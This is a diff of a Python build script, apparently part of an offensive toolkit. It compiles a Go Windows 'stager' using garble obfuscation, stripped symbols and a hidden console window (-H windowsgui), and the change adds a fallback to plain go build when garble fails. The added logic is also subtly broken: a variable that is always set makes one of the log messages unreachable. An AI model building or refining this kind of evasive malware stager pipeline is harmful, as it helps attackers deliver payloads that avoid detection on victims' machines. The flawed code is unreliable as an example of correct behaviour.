@@ -268,6 +268,7 @@ def stage_compile_stager(stager_dir, output_name):
     except FileNotFoundError:
         pass
 
+    compiler = "go build"
     if use_garble:
         log("Compiling stager with garble (symbols + literals obfuscated)...")
         build = subprocess.run(
@@ -275,9 +276,13 @@ def stage_compile_stager(stager_dir, output_name):
              "-ldflags", "-s -w -H windowsgui", "-o", out_path, "."],
             cwd=stager_dir, capture_output=True, text=True, env=env
         )
-    else:
-        log("garble not found, compiling with go build...")
-        log("TIP: go install mvdan.cc/garble@latest  (for obfuscated builds)", "WARN")
+        if build.returncode != 0:
+            log("garble failed (likely Go version mismatch), falling back to go build...", "WARN")
+            use_garble = False
+
+    if not use_garble:
+        if not compiler:
+            log("garble not found, compiling with go build...")
         build = subprocess.run(
             ["go", "build", "-ldflags", "-s -w -H windowsgui", "-o", out_path, "."],
             cwd=stager_dir, capture_output=True, text=True, env=env
